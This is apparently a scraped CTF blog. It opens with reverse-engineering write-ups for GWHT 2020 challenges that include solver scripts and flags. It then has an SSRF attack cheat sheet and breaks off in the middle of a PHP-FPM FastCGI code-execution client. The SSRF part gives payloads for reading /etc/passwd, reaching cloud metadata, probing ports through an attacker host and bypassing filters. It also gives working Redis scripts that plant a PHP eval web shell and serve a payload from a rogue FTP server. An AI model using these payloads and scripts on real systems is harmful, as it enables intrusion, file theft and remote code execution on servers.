放到Sage下求解一把梭： 12345#SageA = Matrix([[...],[...],[...],...,[...]]) #AY = vector([...]) #BA \\ Y# 将list值输入交互得flag： flag: GWHT{4b55c1d5fb6a0234fc252b19e510301a} ​ REVERSElogin 快乐签到！注：得到的 flag 需要 MD5 之后再做提交 183.129.189.60:10028 拖到IDA查看字符串发现很多Py开头的函数，肯定是python写的程序了。 python反编译，先用pyinstxtractor还原到pyc文件，再用uncompyle6还原到py文件。 开始在Python3.8环境下还原发现py文件有问题，根据提示重装至Python3.6环境，还原得到正常的login.py源文件： 12345678910111213141516171819202122232425262728293031323334353637# uncompyle6 version 3.7.2# Python bytecode 3.6 (3379)# Decompiled from: Python 3.8.2 (default, Apr 1 2020, 15:52:55) # [GCC 9.3.0]# Embedded file name: login.pyimport sysinput1 = input(&#x27;input something:&#x27;)if len(input1) != 14: print(&#x27;Wrong length!&#x27;) sys.exit()else: code = [] for i in range(13): code.append(ord(input1[i]) ^ ord(input1[(i + 1)])) code.append(ord(input1[13])) a1 = code[2] a2 = code[1] a3 = code[0] a4 = code[3] a5 = code[4] a6 = code[5] a7 = code[6] a8 = code[7] a9 = code[9] a10 = code[8] a11 = code[10] a12 = code[11] a13 = code[12] a14 = code[13] if (a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5 + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36 + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60 + a14 * 29 == 22748) &amp; (a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25 + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66 + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39 + a14 * 17 == 7258) &amp; (a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65 + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33 + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34 + a14 * 23 == 26190) &amp; (a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59 + a5 * 49 + a6 * 81 + a7 * 25 + (a8 &lt;&lt; 7) - a9 * 32 + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60 + a14 * 29 == 37136) &amp; (a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52 + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36 + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 == 27915) &amp; (a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45 + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26 + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61 + a14 * 28 == 17298) &amp; (a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42 + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47 + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44 + a14 * 65 == 19875) &amp; (a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85 + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30 + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 == 22784) &amp; (a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85 + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36 + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64 + a14 * 27 == 9710) &amp; (a1 * 67 - a2 * 68 + a3 * 68 - a4 * 51 - a5 * 43 + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38 + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52 + a14 * 31 == 13376) &amp; (a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51 + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6 + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67 + a14 * 78 == 24065) &amp; (a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5 + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35 + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61 + a14 * 20 == 27687) &amp; (a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25 + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92 + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 == 29250) &amp; (a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43 + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36 + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 == 15317): print(&#x27;flag is GWHT&#123;md5(your_input)&#125;&#x27;) print(&#x27;Congratulations and have fun!&#x27;) else: print(&#x27;Sorry,plz try again...&#x27;)# okay decompiling login.pyc 三步，1.两两字符异或，2.打乱顺序，3.生成线性方程组。 通过Sage解线性方程组，还原code数组顺序，最后从后往前依次异或还原，md5哈希得flag。 格式化+Sage解方程组： 123456789101112s = &#x27;&#x27;&#x27;(a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5 + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36 + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60 + a14 * 29 == 22748) &amp; (a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25 + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66 + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39 + a14 * 17 == 7258) &amp; (a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65 + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33 + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34 + a14 * 23 == 26190) &amp; (a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59 + a5 * 49 + a6 * 81 + a7 * 25 + (a8 &lt;&lt; 7) - a9 * 32 + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60 + a14 * 29 == 37136) &amp; (a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52 + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36 + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 == 27915) &amp; (a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45 + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26 + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61 + a14 * 28 == 17298) &amp; (a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42 + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47 + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44 + a14 * 65 == 19875) &amp; (a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85 + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30 + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 == 22784) &amp; (a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85 + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36 + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64 + a14 * 27 == 9710) &amp; (a1 * 67 - a2 * 68 + a3 * 68 - a4 * 51 - a5 * 43 + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38 + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52 + a14 * 31 == 13376) &amp; (a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51 + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6 + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67 + a14 * 78 == 24065) &amp; (a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5 + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35 + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61 + a14 * 20 == 27687) &amp; (a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25 + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92 + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 == 29250) &amp; (a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43 + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36 + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 == 15317)&#x27;&#x27;&#x27;.split(&#x27;&amp;&#x27;)A = []B = []for k in s: t = k.strip().strip(&#x27;(&#x27;).strip(&#x27;)&#x27;).split(&#x27;==&#x27;) exp = t[0].replace(&#x27;a1 * &#x27;,&#x27;&#x27;).replace(&#x27; + a2 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a3 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a4 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a5 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a6 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a7 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a8 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a9 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a10 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a11 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a12 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a13 *&#x27;,&#x27;,&#x27;).replace(&#x27; + a14 *&#x27;,&#x27;,&#x27;).replace(&#x27; - a2 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a3 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a4 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a5 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a6 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a7 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a8 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a9 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a10 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a11 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a12 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a13 *&#x27;,&#x27;, -&#x27;).replace(&#x27; - a14 *&#x27;,&#x27;, -&#x27;).replace(&#x27; + (a8 &lt;&lt; 7)&#x27;,&#x27;, &#x27;+str(2**7)) A.append(eval(&#x27;[&#x27;+exp+&#x27;]&#x27;)) B.append(int(t[1]))print(A)print(B) 还原code数组顺序 123456ind = [2, 1, 0, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13]out = [119, 24, 10, 7, 104, 43, 28, 91, 52, 108, 88, 74, 88, 33]ori = [out[ind.index(i)] for i in range(14)]print(ori)#[10, 24, 119, 7, 104, 43, 28, 91, 108, 52, 88, 74, 88, 33] 字符异或 12345678out = [10, 24, 119, 7, 104, 43, 28, 91, 108, 52, 88, 74, 88, 33]flag = out[:]for i in range(12,-1,-1): flag[i] ^= flag[i+1] print(&#x27;&#x27;.join([chr(k) for k in flag]))#U_G07_th3_k3y! 对input进行md5哈希得flag。 flag: GWHT{58964088b637e50d3a22b9510c1d1ef8} ​ Bytecode 了解一下Bytecode 按照Python字节码规则手工逆向，还原过程中可不断使用python -m dis code.py对比是否正确。 还原出源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748en=[3,37,72,9,6,132]output=[101,96,23,68,112,42,107,62,96,53,176,179,98,53,67,29,41,120,60,106,51,101,178,189,101,48]print(&#x27;welcome to GWHT2020&#x27;)flag=raw_input(&#x27;please input your flag:&#x27;)str=flaga=len(str)if a&lt;38: print(&#x27;length wrong!&#x27;) exit(0) if (((ord(str[0])*2020+ord(str[1]))*2020+ord(str[2]))*2020+ord(str[3]))*2020+ord(str[4])==1182843538814603: print(&#x27;good!continue\\xe2\\x80\\xa6\\xe2\\x80\\xa6&#x27;)else: print(&#x27;bye~&#x27;) exit(0)#GWHT&#123; x=[]k=5for i in range(13): b=ord(str[k]) c=ord(str[k+1]) a11=c^en[i%6] a22=b^en[i%6] x.append(a11) x.append(a22) k+=2if x==output: print(&#x27;good!continue\\xe2\\x80\\xa6\\xe2\\x80\\xa6&#x27;)else: print(&#x27;oh,you are wrong!&#x27;) exit(0)l=len(str)a1=ord(str[l-7])a2=ord(str[l-6])a3=ord(str[l-5])a4=ord(str[l-4])a5=ord(str[l-3])a6=ord(str[l-2])if a1*3+a2*2+a3*5==1003: if a1*4+a2*7+a3*9==2013: if a1+a2*8+a3*2==1109: if a4*3+a5*2+a6*5==671: if a4*4+a5*7+a6*9==1252: if a4+a5*8+a6*2==644: print(&#x27;congraduation!you get the right flag!&#x27;) 三部分，1.简单爆破，可直接猜测出GWHT&#123;，2.数组异或，反推，3.线性方程组，Sage解。 连起来即flag。 数组异或 12345678910111213en = [3,37,72,9,6,132]output = [101,96,23,68,112,42,107,62,96,53,176,179,98,53,67,29,41,120,60,106,51,101,178,189,101,48]ori = &#x27;&#x27;k = 0for i in range(13): c = output[k]^en[i%6] b = output[k+1]^en[i%6] ori += chr(b)+chr(c) k += 2 print(ori)#cfa2b87b3f746a8f0ac5c5963f Sage解方程组 123456789#SageA = Matrix([[3,2,5],[4,7,9],[1,8,2]])Y1 = vector([1003,2013,1109])Y2 = vector([671,1252,644])print(A \\ Y1)print(A \\ Y2)#(97, 101, 102)#(102, 55, 51)#aef73 flag: GWHT{cfa2b87b3f746a8f0ac5c5963faef73} ​ easyre easyre IDA打开，跟踪到main函数，代码逻辑清晰，输入字符串通过三步加密处理得到密文： encode_one是base64编码函数，encode_two是字符串分四块乱序函数，encode_three是简单移位函数。 Python脚本： 123456789101112131415161718192021222324252627s=&#x27;EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG&#x27;t=&#x27;&#x27;for i in range(len(s)): x=ord(s[i]) for j in range(127): y=-1 if j&lt;=64 or j&gt;90: if j&lt;=96 or j&gt;122: if j&lt;=47 or j&gt;57: y=j else: y=(j-48+3)%10+48 else: y=(j-97+3)%26+97 else: y=(j-65+3)%26+65 if y==x: t+=chr(j)#t=&#x27;BjYjM2Mjk4NzMR1dIVHs2NzJjY0MTEzM2VhMn0=zQ3NzhhMzhlOD&#x27;u=t[13:26]+t[39:]+t[:13]+t[26:39]#u=&#x27;R1dIVHs2NzJjYzQ3NzhhMzhlODBjYjM2Mjk4NzM0MTEzM2VhMn0=&#x27;import base64print(base64.b64decode(u.encode()))#GWHT&#123;672cc4778a38e80cb362987341133ea2&#125; flag: GWHT{672cc4778a38e80cb362987341133ea2}","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"SSRF","slug":"web-SSRF","date":"2020-09-03T04:02:21.000Z","updated":"2022-04-25T15:14:41.761Z","comments":true,"path":"2020/09/03/web-SSRF/","link":"","permalink":"https://lazzzaro.github.io/2020/09/03/web-SSRF/","excerpt":"","text":"​ 服务器端请求伪造（SSRF）SSRF（Server-Side Request Forger，服务器端请求伪造）是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统） SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。 ​ 基本SSRF123456789101112131415161718HTTP内容获取http://127.0.0.1:80http://0.0.0.0:80http://localhost:80读文件file://path/to/filefile:///etc/passwdfile://\\/\\/etc/passwdssrf.php?url=file:///etc/passwd端口探测（Burpsuite自定义迭代器）dict://&lt;user&gt;;&lt;auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;:&lt;database&gt;:&lt;n&gt;ssrf.php?url=dict://attacker:11111/命令执行/反弹shell（POST请求）gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_&lt;两次URL编码的TCP数据流&gt;gopher://172.17.0.7:80/_POST%2520/index.php%2520HTTP/1.1%250d%250AHost:172.17.0.7%250d%250AContent-Type:application/x-www-form-urlencoded%250d%250AContent-Length:36%250d%250A%250d%250Aname=admin%26password=123456%26result=60%250d%250A 参考：手把手带你用 SSRF 打穿内网 ​ 常用文件123456内网IP地址信息：/etc/hosts网络情况：/proc/net/arp/etc/network/interfaces ​ 绕过12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364HTTPS协议https://127.0.0.1/https://localhost/[::]http://[::]:80/http://0000::1:80/域名跳转http://spoofed.burpcollaborator.nethttp://localtest.mehttp://customer1.app.localhost.my.company.127.0.0.1.nip.iohttp://mail.ebc.apple.com redirect to 127.0.0.6 == localhosthttp://bugbounty.dod.network redirect to 127.0.0.2 == localhost&lt;anything&gt;.&lt;IP Address&gt;.nip.ioCIDRhttp://127.127.127.127http://127.0.1.3http://127.0.0.0十进制IP地址http://0177.0.0.1/http://2130706433/ = http://127.0.0.1http://3232235521/ = http://192.168.0.1http://3232235777/ = http://192.168.1.1IPv6/IPv4地址嵌入http://[0:0:0:0:0:ffff:127.0.0.1]去0地址http://0/http://127.1http://127.0.1bash变量（curl情况）curl -v &quot;http://evil$google.com&quot;$google = &quot;&quot;组合技巧http://1.1.1.1 &amp;@2.2.2.2# @3.3.3.3/urllib2 : 1.1.1.1requests + browsers : 2.2.2.2urllib : 3.3.3.3绕过filter_var()0://evil.com:80;http://google.com:80/绕弱parserhttp://127.1.1.1:80\\@127.2.2.2:80/http://127.1.1.1:80\\@@127.2.2.2:80/http://127.1.1.1:80:\\@@127.2.2.2:80/http://127.1.1.1:80#\\@127.2.2.2:80/DNS记录（检测带外流量监控平台：http://ceye.io/dns-rebinding）http://169.254.169.254http://metadata.nicob.net/http://169.254.169.254.xip.io/http://1ynrnhl.xip.io/http://www.owasp.org.1ynrnhl.xip.io/HTTP302跳转静态:http://nicob.net/redir6a动态:http://nicob.net/redir-http-169.254.169.254:80- ​ 攻击Redis1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162# 脚本1# PHPShell写入脚本import socketfrom urllib.parse import unquote# 对gopherus生成的payload进行一次urldecodepayload = unquote(&quot;&quot;)payload = payload.encode(&#x27;utf-8&#x27;)host = &#x27;0.0.0.0&#x27;port = 23sk = socket.socket()sk.bind((host, port))sk.listen(5)# ftp被动模式的passvie port,监听到1234sk2 = socket.socket()sk2.bind((host, 1234))sk2.listen()# 计数器，用于区分是第几次ftp连接count = 1while 1: conn, address = sk.accept() conn.send(b&quot;200 \\n&quot;) print(conn.recv(20)) # USER aaa\\r\\n 客户端传来用户名 if count == 1: conn.send(b&quot;220 ready\\n&quot;) else: conn.send(b&quot;200 ready\\n&quot;) print(conn.recv(20)) # TYPE I\\r\\n 客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本 if count == 1: conn.send(b&quot;215 \\n&quot;) else: conn.send(b&quot;200 \\n&quot;) print(conn.recv(20)) # SIZE /123\\r\\n 客户端询问文件/123的大小 if count == 1: conn.send(b&quot;213 3 \\n&quot;) else: conn.send(b&quot;300 \\n&quot;) print(conn.recv(20)) # EPSV\\r\\n&#x27; conn.send(b&quot;200 \\n&quot;) print(conn.recv(20)) # PASV\\r\\n 客户端告诉服务端进入被动连接模式 if count == 1: conn.send(b&quot;227 192,168,160,129,4,210\\n&quot;) # 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234 else: conn.send(b&quot;227 127,0,0,1,24,235\\n&quot;) # 端口计算规则：24*256+235=9000 print(conn.recv(20)) # 第一次连接会收到命令RETR /123\\r\\n，第二次连接会收到STOR /123\\r\\n if count == 1: conn.send(b&quot;125 \\n&quot;) # 告诉客户端可以开始数据链接了 # 新建一个socket给服务端返回我们的payload print(&quot;建立连接!&quot;) conn2, address2 = sk2.accept() conn2.send(payload) conn2.close() print(&quot;断开连接!&quot;) else: conn.send(b&quot;150 \\n&quot;) print(conn.recv(20)) exit() # 第一次连接是下载文件，需要告诉客户端下载已经结束 if count == 1: conn.send(b&quot;226 \\n&quot;) conn.close() count += 1 12345678910111213141516171819202122232425262728293031323334353637# 脚本2# 写入shellimport urllib.parseprotocol = &quot;gopher://&quot;ip = &quot;127.0.0.1&quot;port = &quot;6379&quot;shell = &quot;\\n\\n&lt;?php eval($_POST[\\&quot;f4ke\\&quot;]);?&gt;\\n\\n&quot;filename = &quot;5he1l.php&quot;path = &quot;/var/www/html&quot;passwd = &quot;&quot;cmd = [&quot;auth 123123&quot;, &quot;flushall&quot;, &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)), &quot;config set dir &#123;&#125;&quot;.format(path), &quot;config set dbfilename &#123;&#125;&quot;.format(filename), &quot;save&quot;, &quot;quit&quot; ]if passwd: cmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))payload = protocol + ip + &quot;:&quot; + port + &quot;/_&quot;def redis_format(arr): CRLF = &quot;\\r\\n&quot; redis_arr = arr.split(&quot; &quot;) cmd = &quot;&quot; cmd += &quot;*&quot; + str(len(redis_arr)) for x in redis_arr: cmd += CRLF + &quot;$&quot; + str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)))) + CRLF + x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;) cmd += CRLF return cmdif __name__==&quot;__main__&quot;: for x in cmd: payload += urllib.parse.quote(redis_format(x)) # print(payload) print(urllib.parse.quote(payload)) ​ PHP-FPM / FastCGIFastCGI是一个协议，PHP-FPM是实现了FastCGI协议的程序，全称PHP FastCGI Process Manager，即PHP FastCGI的进程管理器，运行在默认运行在9000端口。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254import socketimport randomimport argparseimport sysfrom io import BytesIO # Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client PY2 = True if sys.version_info.major == 2 else False #判断python 版本 def bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i]) def bord(c): if isinstance(c, int): return c else: return ord(c) def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode(&#x27;utf-8&#x27;, &#x27;strict&#x27;) def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s = str(s, &#x27;utf-8&#x27;, &#x27;strict&#x27;) else: s = str(s) return s class FastCGIClient: &quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot; # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 __FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 __FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__(self, host, port, timeout, keepalive): self.host = host self.port = port self.timeout = timeout if keepalive: self.keepalive = 1 else: self.keepalive = 0 self.sock = None self.requests = dict() def __connect(self): self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(self.timeout) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try: self.sock.connect((self.host, int(self.port))) except socket.error as msg: self.sock.close() self.sock = None print(repr(msg)) return False return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length = len(content) buf = bchr(FastCGIClient.__FCGI_VERSION) \\ + bchr(fcgi_type) \\ + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\ + bchr(requestid &amp; 0xFF) \\ + bchr((length &gt;&gt; 8) &amp; 0xFF) \\ + bchr(length &amp; 0xFF) \\ + bchr(0) \\ + bchr(0) \\ + content return buf def __encodeNameValueParams(self, name, value): nLen = len(name) vLen = len(value) record = b&#x27;&#x27; if nLen &lt; 128: record += bchr(nLen) else: record += bchr((nLen &gt;&gt; 24) | 0x80) \\ + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(nLen &amp; 0xFF) if vLen &lt; 128: record += bchr(vLen) else: record += bchr((vLen &gt;&gt; 24) | 0x80) \\ + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(vLen &amp; 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header = dict() header[&#x27;version&#x27;] = bord(stream[0]) header[&#x27;type&#x27;] = bord(stream[1]) header[&#x27;requestId&#x27;] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3]) header[&#x27;contentLength&#x27;] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5]) header[&#x27;paddingLength&#x27;] = bord(stream[6]) header[&#x27;reserved&#x27;] = bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header = buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record = self.__decodeFastCGIHeader(header) record[&#x27;content&#x27;] = b&#x27;&#x27; if &#x27;contentLength&#x27; in record.keys(): contentLength = int(record[&#x27;contentLength&#x27;]) record[&#x27;content&#x27;] += buffer.read(contentLength) if &#x27;paddingLength&#x27; in record.keys(): skiped = buffer.read(int(record[&#x27;paddingLength&#x27;])) return record def request(self, nameValuePairs=&#123;&#125;, post=&#x27;&#x27;): if not self.__connect(): print(&#x27;connect failure! please check your fasctcgi-server !!&#x27;) return requestId = random.randint(1, (1 &lt;&lt; 16) - 1) # 1 --65535 self.requests[requestId] = dict() request = b&quot;&quot; beginFCGIRecordContent = bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b&#x27;&#x27; if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b&#x27;&#x27;, requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b&#x27;&#x27;, requestId) self.sock.send(request) self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND self.requests[requestId][&#x27;response&#x27;] = b&#x27;&#x27; return self.__waitForResponse(requestId) def __waitForResponse(self, requestId): data = b&#x27;&#x27; while True: buf = self.sock.recv(512) if not len(buf): break data += buf data = BytesIO(data) while True: response = self.__decodeFastCGIRecord(data) if not response: break if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDOUT \\ or response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR: if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR: self.requests[&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_ERROR if requestId == int(response[&#x27;requestId&#x27;]): self.requests[requestId][&#x27;response&#x27;] += response[&#x27;content&#x27;] if response[&#x27;type&#x27;] == FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId][&#x27;response&#x27;] def __repr__(self): return &quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;.format(self.host, self.port) if __name__ == &#x27;__main__&#x27;: parser = argparse.ArgumentParser(description=&#x27;Php-fpm code execution vulnerability client.&#x27;) parser.add_argument(&#x27;host&#x27;, help=&#x27;Target host, such as 127.0.0.1&#x27;) parser.add_argument(&#x27;file&#x27;, help=&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;) parser.add_argument(&#x27;-c&#x27;, &#x27;--code&#x27;, help=&#x27;What php code your want to execute&#x27;, default=&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;) parser.add_argument(&#x27;-p&#x27;, &#x27;--port&#x27;, help=&#x27;FastCGI port&#x27;, default=9000, type=int) args = parser.parse_args() client = FastCGIClient(args.host, args.port, 3, 0) params = dict() documentRoot = &quot;/&quot; uri = args.file content = args.code params = &#123; &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;, &#x27;REQUEST_METHOD&#x27;: &#x27;POST&#x27;, &#x27;SCRIPT_FILENAME&#x27;: documentRoot + uri.lstrip(&#x27;/&#x27;), &#x27;SCRIPT_NAME&#x27;: uri, &#x27;QUERY_STRING&#x27;: &#x27;&#x27;, 